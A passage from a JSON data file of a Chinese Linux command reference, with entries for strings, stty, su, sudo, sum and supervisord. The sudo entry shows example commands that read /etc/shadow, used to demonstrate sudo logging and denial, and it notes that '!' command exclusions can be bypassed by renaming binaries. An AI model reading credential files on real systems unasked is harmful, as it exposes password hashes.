class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">606676</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0Y!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4370944</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">607900</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0\\\\\"</span>..., <span class=\"hljs-number\">1024</span>, <span class=\"hljs-number\">4372480</span>) = <span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">608161</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0\\\\\"</span>..., <span class=\"hljs-number\">1024</span>, <span class=\"hljs-number\">4372480</span>) = <span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">608816</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0^!\"</span>..., <span class=\"hljs-number\">1024</span>, <span class=\"hljs-number\">4373504</span>) = <span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">609071</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0^!\"</span>..., <span class=\"hljs-number\">1024</span>, <span class=\"hljs-number\">4373504</span>) = <span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">611142</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0`!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4374528</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">611454</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0`!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4374528</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">05</span>.<span class=\"hljs-number\">602804</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0c!\"</span>..., <span class=\"hljs-number\">1024</span>, <span class=\"hljs-number\">4376064</span>) = <span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">05</span>.<span class=\"hljs-number\">603119</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0c!\"</span>..., <span class=\"hljs-number\">1024</span>, <span class=\"hljs-number\">4376064</span>) = <span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">05</span>.<span class=\"hljs-number\">607731</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0e!\"</span>..., <span class=\"hljs-number\">1024</span>, <span class=\"hljs-number\">4377088</span>) = <span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">05</span>.<span class=\"hljs-number\">608020</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0e!\"</span>..., <span class=\"hljs-number\">1024</span>, <span class=\"hljs-number\">4377088</span>) = <span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">05</span>.<span class=\"hljs-number\">608690</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0g!\"</span>..., <span class=\"hljs-number\">1024</span>, <span class=\"hljs-number\">4378112</span>) = <span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">05</span>.<span class=\"hljs-number\">608962</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0g!\"</span>..., <span class=\"hljs-number\">1024</span>, <span class=\"hljs-number\">4378112</span>) = <span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">05</span>.<span class=\"hljs-number\">611022</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0i!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4379136</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">05</span>.<span class=\"hljs-number\">611283</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0i!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4379136</span>) = <span class=\"hljs-number\">1536</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "strings",
        "des": "在对象文件或二进制文件中查找可打印的字符串",
        "body": "<h1 id=\"strings\">strings</h1>\n<p>在对象文件或二进制文件中查找可打印的字符串</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>strings命令</strong> 在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">strings <span class=\"hljs-selector-attr\">[ -a ]</span> <span class=\"hljs-selector-attr\">[ - ]</span> <span class=\"hljs-selector-attr\">[ -o ]</span> <span class=\"hljs-selector-attr\">[ -t Format ]</span> <span class=\"hljs-selector-attr\">[ -n Number ]</span> <span class=\"hljs-selector-attr\">[ -Number ]</span>  <span class=\"hljs-selector-attr\">[file ... ]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-keyword\">a</span> <span class=\"hljs-comment\">--all：扫描整个文件而不是只扫描目标文件初始化和装载段</span>\n-f –print-<span class=\"hljs-built_in\">file</span>-name：在显示字符串前先显示文件名\n-n –<span class=\"hljs-keyword\">bytes</span>=[<span class=\"hljs-built_in\">number</span>]：找到并且输出所有NUL终止符序列\n- ：设置显示的最少的字符数，默认是<span class=\"hljs-number\">4</span>个字符\n-t <span class=\"hljs-comment\">--radix={o,d,x} ：输出字符的位置，基于八进制，十进制或者十六进制</span>\n-o ：类似<span class=\"hljs-comment\">--radix=o</span>\n-T <span class=\"hljs-comment\">--target= ：指定二进制文件格式</span>\n-e <span class=\"hljs-comment\">--encoding={s,S,b,l,B,L} ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit</span>\n@ ：读取中选项\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>列出ls中所有的ASCII文本：</p>\n<pre><code class=\"language-shell\">strings <span class=\"hljs-regexp\">/bin/</span>ls\n</code></pre>\n<p>列出ls中所有的ASCII文本：</p>\n<pre><code class=\"language-shell\">cat <span class=\"hljs-regexp\">/bin/</span>ls strings\n</code></pre>\n<p>查找ls中包含libc的字符串，不区分大小写：</p>\n<pre><code class=\"language-shell\">strings <span class=\"hljs-regexp\">/bin/</span>ls | <span class=\"hljs-keyword\">grep</span> -i libc\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "stty",
        "des": "修改终端命令行的相关设置",
        "body": "<h1 id=\"stty\">stty</h1>\n<p>修改终端命令行的相关设置</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>stty命令</strong> 修改终端命令行的相关设置。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">stty</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：以容易阅读的方式打印当前的所有配置；</span>\n<span class=\"hljs-deletion\">-g：以stty可读方式打印当前的所有配置。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>终端设置：指定终端命令行的设置选项。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>在命令行下，禁止输出大写的方法：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">stty</span> iuclc     <span class=\"hljs-comment\">#开启</span>\nstty -iuclc    <span class=\"hljs-comment\">#恢复</span>\n</code></pre>\n<p> <strong>在命令行下禁止输出小写：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">stty</span> olcuc    <span class=\"hljs-comment\">#开启</span>\nstty -olcuc   <span class=\"hljs-comment\">#恢复</span>\n</code></pre>\n<p> <strong>打印出终端的行数和列数：</strong> </p>\n<pre><code class=\"language-shell\">stty size\n</code></pre>\n<p> <strong>改变Ctrl+D的方法:</strong> </p>\n<pre><code class=\"language-shell\">stty <span class=\"hljs-literal\">eof</span> <span class=\"hljs-string\">\"string\"</span>\n</code></pre>\n<p>系统默认是Ctrl+D来表示文件的结束，而通过这种方法，可以改变！</p>\n<p> <strong>屏蔽显示：</strong> </p>\n<pre><code class=\"language-shell\">stty -<span class=\"hljs-built_in\">echo</span>   <span class=\"hljs-comment\">#禁止回显</span>\nstty <span class=\"hljs-built_in\">echo</span>    <span class=\"hljs-comment\">#打开回显</span>\n</code></pre>\n<p>测试方法:</p>\n<pre><code class=\"language-shell\">stty -<span class=\"hljs-built_in\">echo</span>;<span class=\"hljs-built_in\">read</span>;stty <span class=\"hljs-built_in\">echo</span>;<span class=\"hljs-built_in\">read</span>\n</code></pre>\n<p> <strong>忽略回车符：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">stty</span> igncr     <span class=\"hljs-comment\">#开启</span>\nstty -igncr    <span class=\"hljs-comment\">#恢复</span>\n</code></pre>\n<p> <strong>定时输入：</strong> </p>\n<pre><code class=\"language-shell\">timeout_read()\n{\n    timeout=$1\n    old_stty_settings=<span class=\"hljs-string\">`stty -g`</span>　　<span class=\"hljs-comment\">#save current settings</span>\n    stty -icanon min <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">time</span> <span class=\"hljs-number\">100</span>　　<span class=\"hljs-comment\">#set 10seconds,not 100seconds</span>\n    <span class=\"hljs-keyword\">eval</span> <span class=\"hljs-keyword\">read</span> varname　　          <span class=\"hljs-comment\">#=read $varname</span>\n    stty <span class=\"hljs-string\">\"$old_stty_settings\"</span>　　  <span class=\"hljs-comment\">#recover settings</span>\n}\n</code></pre>\n<p>更简单的方法就是利用read命令的<code>-t</code>选项：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">read</span> -t <span class=\"hljs-number\">10</span> varname\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "su",
        "des": "用于切换当前用户身份到其他用户身份",
        "body": "<h1 id=\"su\">su</h1>\n<p>用于切换当前用户身份到其他用户身份</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>su命令</strong> 用于切换当前用户身份到其他用户身份，变更时须输入所要变更的用户帐号与密码。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">su</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-c&lt;指令&gt;或--command=&lt;指令&gt;：执行完指定的指令后，即恢复原来的身份；\n-f或——fast：适用于csh与tsch，使<span class=\"hljs-keyword\">shell</span>不用去读取启动文件；\n-<span class=\"hljs-keyword\">l</span>或——login：改变身份时，也同时变更工作目录，以及HOME,<span class=\"hljs-keyword\">SHELL</span>,USER,logname。此外，也会变更PATH变量；\n-<span class=\"hljs-keyword\">m</span>,-p或--<span class=\"hljs-keyword\">preserve</span>-environment：变更身份时，不要变更环境变量；\n-s&lt;<span class=\"hljs-keyword\">shell</span>&gt;或--<span class=\"hljs-keyword\">shell</span>=&lt;<span class=\"hljs-keyword\">shell</span>&gt;：指定要执行的<span class=\"hljs-keyword\">shell</span>；\n--<span class=\"hljs-keyword\">help</span>：显示帮助；\n--<span class=\"hljs-keyword\">version</span>；显示版本信息。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户：指定要切换身份的目标用户。</p>\n<h3 id=\"实例\">实例</h3>\n<p>变更帐号为root并在执行ls指令后退出变回原使用者：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">su</span> -c <span class=\"hljs-keyword\">ls</span> root\n</code></pre>\n<p>变更帐号为root并传入<code>-f</code>选项给新执行的shell：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">su root -f</span>\n</code></pre>\n<p>变更帐号为test并改变工作目录至test的家目录：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">su</span> -<span class=\"hljs-keyword\">test</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "sudo",
        "des": "以其他身份来执行命令",
        "body": "<h1 id=\"sudo\">sudo</h1>\n<p>以其他身份来执行命令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sudo命令</strong> 用来以其他身份来执行命令，预设的身份为root。在<code>/etc/sudoers</code>中设置了可执行sudo指令的用户。若其未经授权的用户企图使用sudo，则会发出警告的邮件给管理员。用户使用sudo时，必须先输入密码，之后有5分钟的有效期限，超过期限则必须重新输入密码。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">sudo</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：在后台执行指令；</span>\n<span class=\"hljs-deletion\">-E：继承当前环境变量</span>\n<span class=\"hljs-deletion\">-h：显示帮助；</span>\n<span class=\"hljs-deletion\">-H：将HOME环境变量设为新身份的HOME环境变量；</span>\n<span class=\"hljs-deletion\">-k：结束密码的有效期限，也就是下次再执行sudo时便需要输入密码；。</span>\n<span class=\"hljs-deletion\">-l：列出目前用户可执行与无法执行的指令；</span>\n<span class=\"hljs-deletion\">-p：改变询问密码的提示符号；</span>\n<span class=\"hljs-deletion\">-s&lt;shell&gt;：执行指定的shell；</span>\n<span class=\"hljs-deletion\">-u&lt;用户&gt;：以指定的用户作为新的身份。若不加上此参数，则预设以root作为新的身份；</span>\n<span class=\"hljs-deletion\">-v：延长密码有效期限5分钟；</span>\n<span class=\"hljs-deletion\">-V ：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>指令：需要运行的指令和对应的参数。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">$ sudo su -\n# env | <span class=\"hljs-type\">grep</span> -E '(HOME|<span class=\"hljs-type\">SHELL</span>|<span class=\"hljs-type\">USER</span>|<span class=\"hljs-type\">LOGNAME</span>|<span class=\"hljs-type\">^PATH</span>|<span class=\"hljs-type\">PWD</span>|<span class=\"hljs-type\">TEST_ETC</span>|<span class=\"hljs-type\">TEST_ZSH</span>|<span class=\"hljs-type\">TEST_PRO</span>|<span class=\"hljs-type\">TEST_BASH</span>|<span class=\"hljs-type\">TEST_HOME</span>|<span class=\"hljs-type\">SUDO</span>)'\n</code></pre>\n<p>这个命令相当于使用root超级用户重新登录一次shell，只不过密码是使用的当前用户的密码。而且重要是，该命令会 <strong>重新加载/etc/profile文件以及/etc/bashrc文件等系统配置文件，并且还会重新加载root用户的$SHELL环境变量所对应的配置文件</strong> ，比如：root超级用户的$SHELL是/bin/bash，则会加载/root/.bashrc等配置。如果是/bin/zsh，则会加载/root/.zshrc等配置，执行后是完全的root环境。</p>\n<pre><code class=\"language-shell\">$ sudo -i\n# env | <span class=\"hljs-type\">grep</span> -E '(HOME|<span class=\"hljs-type\">SHELL</span>|<span class=\"hljs-type\">USER</span>|<span class=\"hljs-type\">LOGNAME</span>|<span class=\"hljs-type\">^PATH</span>|<span class=\"hljs-type\">PWD</span>|<span class=\"hljs-type\">TEST_ETC</span>|<span class=\"hljs-type\">TEST_ZSH</span>|<span class=\"hljs-type\">TEST_PRO</span>|<span class=\"hljs-type\">TEST_BASH</span>|<span class=\"hljs-type\">TEST_HOME</span>|<span class=\"hljs-type\">SUDO</span>)'\n</code></pre>\n<p>这个命令基本与 <code>sudo su -</code> 相同，执行后也是root超级用户的环境，只不过是多了一些当前用户的信息。</p>\n<pre><code class=\"language-shell\">$ sudo -s\n# env|<span class=\"hljs-type\">grep</span> -E '(HOME|<span class=\"hljs-type\">SHELL</span>|<span class=\"hljs-type\">USER</span>|<span class=\"hljs-type\">LOGNAME</span>|<span class=\"hljs-type\">^PATH</span>|<span class=\"hljs-type\">PWD</span>|<span class=\"hljs-type\">TEST_ETC</span>|<span class=\"hljs-type\">TEST_ZSH</span>|<span class=\"hljs-type\">TEST_PRO</span>|<span class=\"hljs-type\">TEST_BASH</span>|<span class=\"hljs-type\">TEST_HOME</span>|<span class=\"hljs-type\">SUDO</span>)'  --color\n</code></pre>\n<p>这个命令相当于 <strong>以当前用户的$SHELL开启了一个root超级用户的no-login的shell，不会加载/etc/profile等系统配置</strong> 。所以/etc/profile文件中定义的TEST_ETC环境变量就看不到了，但是会<strong>加载root用户对应的配置文件</strong>，比如root用户的$SHELL是/bin/zsh，那么会加载/root/.zshrc配置文件，执行完后，不会切换当前用户的目录。</p>\n<p>配置sudo必须通过编辑<code>/etc/sudoers</code>文件，而且只有超级用户才可以修改它，还必须使用visudo编辑。之所以使用visudo有两个原因，一是它能够防止两个用户同时修改它；二是它也能进行有限的语法检查。所以，即使只有你一个超级用户，你也最好用visudo来检查一下语法。</p>\n<p>visudo默认的是在vi里打开配置文件，用vi来修改文件。我们可以在编译时修改这个默认项。visudo不会擅自保存带有语法错误的配置文件，它会提示你出现的问题，并询问该如何处理，就像：</p>\n<pre><code class=\"language-shell\">&gt;&gt;&gt; sudoers <span class=\"hljs-keyword\">file</span>: <span class=\"hljs-keyword\">syntax</span> <span class=\"hljs-keyword\">error</span>, <span class=\"hljs-keyword\">line</span> 22 &lt;&lt;\n</code></pre>\n<p>此时我们有三种选择：键入“e”是重新编辑，键入“x”是不保存退出，键入“Q”是退出并保存。如果真选择Q，那么sudo将不会再运行，直到错误被纠正。</p>\n<p>现在，我们一起来看一下神秘的配置文件，学一下如何编写它。让我们从一个简单的例子开始：让用户Foobar可以通过sudo执行所有root可执行的命令。以root身份用visudo打开配置文件，可以看到类似下面几行：</p>\n<pre><code class=\"language-shell\"># Runas <span class=\"hljs-keyword\">alias</span> specification\n# <span class=\"hljs-keyword\">User</span> privilege specificationroot    <span class=\"hljs-keyword\">ALL</span>=(<span class=\"hljs-keyword\">ALL</span>)<span class=\"hljs-keyword\">ALL</span>\n</code></pre>\n<p>我们一看就明白个差不多了，root有所有权限，只要仿照现有root的例子就行，我们在下面加一行（最好用tab作为空白）：</p>\n<pre><code class=\"language-shell\">foobar <span class=\"hljs-keyword\">ALL</span>=(<span class=\"hljs-keyword\">ALL</span>)    <span class=\"hljs-keyword\">ALL</span>\n</code></pre>\n<p>保存退出后，切换到foobar用户，我们用它的身份执行命令：</p>\n<pre><code class=\"language-shell\">[foobar@localhost ~]$ <span class=\"hljs-keyword\">ls</span> /root\n<span class=\"hljs-keyword\">ls</span>: /root: 权限不够\n\n[foobar@localhost ~]$ sudo <span class=\"hljs-keyword\">ls</span> /root\nPassWord:\nanaconda-ks.cfg Desktop install.<span class=\"hljs-keyword\">log</span> install.<span class=\"hljs-keyword\">log</span>.syslog\n</code></pre>\n<p>好了，我们限制一下foobar的权利，不让他为所欲为。比如我们只想让他像root那样使用ls和ifconfig，把那一行改为：</p>\n<pre><code class=\"language-shell\">foobar localhost=    <span class=\"hljs-regexp\">/sbin/i</span>fconfig,   <span class=\"hljs-regexp\">/bin/</span>ls\n</code></pre>\n<p>再来执行命令：</p>\n<pre><code class=\"language-shell\">[foobar@localhost ~]$ sudo head -5 /etc/shadow\nPassword:\nSorry, user foobar is<span class=\"hljs-built_in\"> not </span>allowed to<span class=\"hljs-built_in\"> execute </span>'/usr/bin/head -5 /etc/shadow' as root on localhost.localdomain.\n\n[foobar@localhost ~]$ sudo /sbin/ifconfigeth0      Linkencap:Ethernet HWaddr 00:14:85:EC:E9:9B...\n</code></pre>\n<p>现在让我们来看一下那三个ALL到底是什么意思。第一个ALL是指网络中的主机，我们后面把它改成了主机名，它指明foobar可以在此主机上执行后面的命令。第二个括号里的ALL是指目标用户，也就是以谁的身份去执行命令。最后一个ALL当然就是指命令名了。例如，我们想让foobar用户在linux主机上以jimmy或rene的身份执行kill命令，这样编写配置文件：</p>\n<pre><code class=\"language-shell\">foobar    linux=(jimmy,rene)    <span class=\"hljs-regexp\">/bin/</span>kill\n</code></pre>\n<p>但这还有个问题，foobar到底以jimmy还是rene的身份执行？这时我们应该想到了<code>sudo -u</code>了，它正是用在这种时候。 foobar可以使用<code>sudo -u jimmy kill PID</code>或者<code>sudo -u rene kill PID</code>，但这样挺麻烦，其实我们可以不必每次加<code>-u</code>，把rene或jimmy设为默认的目标用户即可。再在上面加一行：</p>\n<pre><code class=\"language-shell\">Defaults:foobar    <span class=\"hljs-attribute\">runas_default</span>=rene\n</code></pre>\n<p>Defaults后面如果有冒号，是对后面用户的默认，如果没有，则是对所有用户的默认。就像配置文件中自带的一行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Defaults    env_reset</span>\n</code></pre>\n<p>另一个问题是，很多时候，我们本来就登录了，每次使用sudo还要输入密码就显得烦琐了。我们可不可以不再输入密码呢？当然可以，我们这样修改配置文件：</p>\n<pre><code class=\"language-shell\">foobar localhost=NOPASSWD:     <span class=\"hljs-regexp\">/bin/</span>cat, <span class=\"hljs-regexp\">/bin/</span>ls\n</code></pre>\n<p>再来sudo一下：</p>\n<pre><code class=\"language-shell\">[foobar@localhost ~]$ sudo <span class=\"hljs-keyword\">ls</span> /rootanaconda-ks.cfg Desktop install.<span class=\"hljs-keyword\">log</span>\ninstall.<span class=\"hljs-keyword\">log</span>.syslog\n</code></pre>\n<p>当然，你也可以说“某些命令用户foobar不可以运行”，通过使用!操作符，但这不是一个好主意。因为，用!操作符来从ALL中“剔出”一些命令一般是没什么效果的，一个用户完全可以把那个命令拷贝到别的地方，换一个名字后再来运行。</p>\n<p> <strong>日志与安全</strong> </p>\n<p>sudo为安全考虑得很周到，不仅可以记录日志，还能在有必要时向系统管理员报告。但是，sudo的日志功能不是自动的，必须由管理员开启。这样来做：</p>\n<pre><code class=\"language-shell\">touch <span class=\"hljs-regexp\">/var/</span>log/sudo\nvi <span class=\"hljs-regexp\">/etc/</span>syslog.conf\n</code></pre>\n<p>在syslog.conf最后面加一行（必须用tab分割开）并保存：</p>\n<pre><code class=\"language-shell\">local2.debug                    <span class=\"hljs-regexp\">/var/</span>log/sudo\n</code></pre>\n<p>重启日志守候进程，</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">ps</span> aux <span class=\"hljs-keyword\">grep</span> syslogd\n</code></pre>\n<p>把得到的syslogd进程的PID（输出的第二列是PID）填入下面：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">kill</span> –HUP PID\n</code></pre>\n<p>这样，sudo就可以写日志了：</p>\n<pre><code class=\"language-shell\">[foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg\nDesktop install.log\ninstall.log.syslog\n<span class=\"hljs-variable\">$cat</span> <span class=\"hljs-regexp\">/var/</span>log/sudoJul <span class=\"hljs-number\">28</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">54</span> localhost sudo:   foobar :\nTTY=pts<span class=\"hljs-regexp\">/1 ; pwd=/</span>home<span class=\"hljs-regexp\">/foobar ; USER=root ; command=/</span>bin<span class=\"hljs-regexp\">/ls /</span>root\n</code></pre>\n<p>不过，有一个小小的“缺陷”，sudo记录日志并不是很忠实：</p>\n<pre><code class=\"language-shell\">[foobar@localhost ~]$ sudo cat <span class=\"hljs-regexp\">/etc/</span>shadow &gt; <span class=\"hljs-regexp\">/dev/</span><span class=\"hljs-keyword\">null</span>\ncat <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/sudo...Jul 28 23:10:24 localhost sudo:   foobar : TTY=pts/</span><span class=\"hljs-number\">1</span> ;\nPWD=<span class=\"hljs-regexp\">/home/</span>foobar ; USER=root ; COMMAND=<span class=\"hljs-regexp\">/bin/</span>cat <span class=\"hljs-regexp\">/etc/</span>shadow\n</code></pre>\n<p>重定向没有被记录在案！为什么？因为在命令运行之前，shell把重定向的工作做完了，sudo根本就没看到重定向。这也有个好处，下面的手段不会得逞：</p>\n<pre><code class=\"language-shell\">[foobar<span class=\"hljs-meta\">@localhost</span> ~]$ sudo ls /root &gt; <span class=\"hljs-regexp\">/etc/</span><span class=\"hljs-attr\">shadowbash</span>: <span class=\"hljs-regexp\">/etc/</span><span class=\"hljs-attr\">shadow</span>: 权限不够\n</code></pre>\n<p>sudo 有自己的方式来保护安全。以root的身份执行<code>sudo-V</code>，查看一下sudo的设置。因为考虑到安全问题，一部分环境变量并没有传递给sudo后面的命令，或者被检查后再传递的，比如：PATH，HOME，SHELL等。当然，你也可以通过sudoers来配置这些环境变量。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "sum",
        "des": "计算文件的校验码和显示块数",
        "body": "<h1 id=\"sum\">sum</h1>\n<p>计算文件的校验码和显示块数</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sum命令</strong> 用于计算并显示指定文件的校验和与文件所占用的磁盘块数。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">sum</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-r：使用BSD的校验和算法，块大小为1k；</span>\n<span class=\"hljs-deletion\">-s：使用system V的校验和算法，块大小为512字节。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件列表：需要计算和与磁盘块数的文件列表。</p>\n<h3 id=\"实例\">实例</h3>\n<p>计算文件校验码：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># sum insert.sql</span>\n<span class=\"hljs-number\">00827</span>    <span class=\"hljs-number\">12</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "supervisord",
        "des": "配置后台服务/常驻进程的进程管家工具",
        "body": "<h1 id=\"supervisord\">supervisord</h1>\n<p>配置后台服务/常驻进程的进程管家工具</p>\n<h2 id=\"安装\">安装</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 安装 supervisord</span>\napt-<span class=\"hljs-built_in\">get</span> install supervisor\n</code></pre>\n<h2 id=\"实例\">实例</h2>\n<p>生成配置文件 <code>/etc/supervisord.conf</code></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-section\">[program:app]</span>\n<span class=\"hljs-attr\">command</span>=/usr/bin/gunicorn -w <span class=\"hljs-number\">1</span> wsgiapp:application\n<span class=\"hljs-attr\">directory</span>=/srv/www\n<span class=\"hljs-attr\">user</span>=www-data\n</code></pre>\n<p>supervisord: 启动 supervisor 服务</p>\n<pre><code class=\"language-shell\">supervisorctl <span class=\"hljs-literal\">start</span> app\nsupervisorctl <span class=\"hljs-literal\">stop</span> app\nsupervisorctl reload <span class=\"hljs-comment\"># 修改/添加配置文件需要执行这个</span>\n</code></pre>\n<h2 id=\"下载地址\">下载地址</h2>\n<p><a href=\"https://pypi.python.org/pypi/meld3\">https://pypi.python.org/pypi/meld3</a><br><a href=\"https://pypi.python.org/pypi/supervisor\">https://pypi.python.org/pypi/supervisor</a>  </p>\n"
    },
    {
        "title": "suspend",
        "des": "挂起shell的执行。",
